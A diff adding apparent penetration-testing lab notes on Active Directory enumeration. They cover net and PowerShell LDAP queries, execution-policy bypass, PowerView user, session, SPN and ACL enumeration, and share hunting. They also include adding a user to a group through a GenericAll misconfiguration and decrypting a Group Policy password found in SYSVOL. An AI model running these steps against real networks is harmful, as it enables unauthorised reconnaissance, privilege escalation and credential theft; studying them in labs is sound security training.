@@ -1,0 +1,160 @@
+Active Directory - Enumeration Using Legacy Windows Tools
+
+1 - net user /domain > to see users in domain
+
+2 - net user user /domain > to know who is admins on DC
+
+3 - net group /domain > to see how many groups in AD
+
+4 - net group "GROUP NAME" /domain > change group name to the group you found to know who is in the group
+
+Enumerating Active Directory using PowerShell and .NET Classes
+
+1 - [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() > get the domain name
+
+2 - script enum powershell
+
+# Store the domain object in the $domainObj variable
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+
+# Print the variable
+$domainObj
+
+# this will give you only domain name Which is PdcRoleOwner 
+$PDC = $domainObj.PdcRoleOwner.Name
+
+# LDAP PATH
+([adsi]'').distinguishedName
+
+# LDAP Property
+$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
+$DN = ([adsi]'').distinguishedName 
+$LDAP = "LDAP://$PDC/$DN"
+$LDAP
+
+$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
+
+$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
+$dirsearcher.filter="samAccountType=805306368"
+#$dirsearcher.filter="name=jeffadmin" # you will find it from enum and you can add it here
+$dirsearcher.FindAll()
+
+$result = $dirsearcher.FindAll()
+
+Foreach($obj in $result)
+{
+    Foreach($prop in $obj.Properties)
+    {
+        $prop.memberof
+    }
+
+    Write-Host "-------------------------------"
+}
+
+3 - powershell -ep bypass
+
+4 - .\enum.ps1
+
+Adding Search Functionality to our Script
+
+foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
+$group.properties | select {$_.cn}, {$_.member}
+}
+
+
+
+AD Enumeration with PowerView
+
+1 - powershell -ep bypass
+
+2 - Import-Module .\PowerView.ps1
+
+3 - Get-NetDomain
+
+4 - Get-NetUser
+
+5 - Get-NetUser | select cn
+
+6 - Get-NetUser | select cn,pwdlastset,lastlogon
+
+7 - Get-NetGroup | select cn
+
+8 - Get-NetGroup "Sales Department" | select member
+
+Enumerating Operating Systems
+
+9 - Get-NetComputer
+
+10 - Get-NetComputer | select operatingsystem,dnshostname,distinguishedname
+
+Getting an Overview - Permissions and Logged on Users Powerview
+
+1 - Find-LocalAdminAccess
+
+2 - Get-NetSession -ComputerName files04
+
+3 - Get-NetSession -ComputerName web04
+
+4 - Get-NetSession -ComputerName files04 -Verbose
+
+5 - Get-NetSession -ComputerName web04 -Verbose
+
+6 - Get-NetSession -ComputerName client74
+
+7 - Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
+
+8 - Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
+
+9 - .\PsLoggedon.exe \\files04
+
+10 - .\PsLoggedon.exe \\web04
+
+Enumeration Through Service Principal Names
+
+1 - setspn -L iis_service
+
+2 - Get-NetUser -SPN | select samaccountname,serviceprincipalname
+
+3 - nslookup.exe web04.corp.com
+
+Enumerating Object Permissions
+
+1 - Get-ObjectAcl -Identity stephanie
+
+2 - Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104 # number we take it from ( Get-ObjectAcl -Identity stephanie = [[[ObjectSID]]] )
+
+3 - Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553 # number from SecurityIdentifier
+
+4 - Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+
+5 - "S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName < from managment department you can change
+
+6 - net group "Management Department" stephanie /add /domain < beacuse of the misconfigure in the last command 
+
+7 - Get-NetGroup "Management Department" | select member < verifiy our self user
+
+8 - net group "Management Department" stephanie /del /domain < check we are in the group ?
+
+9 - Get-NetGroup "Management Department" | select member > from PowerView
+
+Enumerating Domain Shares
+
+1 - Find-DomainShare
+
+2 - ls \\dc1.corp.com\sysvol\corp.com\
+
+3 - ls \\dc1.corp.com\sysvol\corp.com\Policies\
+
+4 - cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml < find decrypt pass use gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
+
+5 - ls \\FILES04\docshare
+
+6 - ls \\FILES04\docshare\docs\do-not-share
+
+7 - cat \\FILES04\docshare\docs\do-not-share\start-email.txt
+
+8 - Invoke-ShareFinder
+
+9 - 
+
+
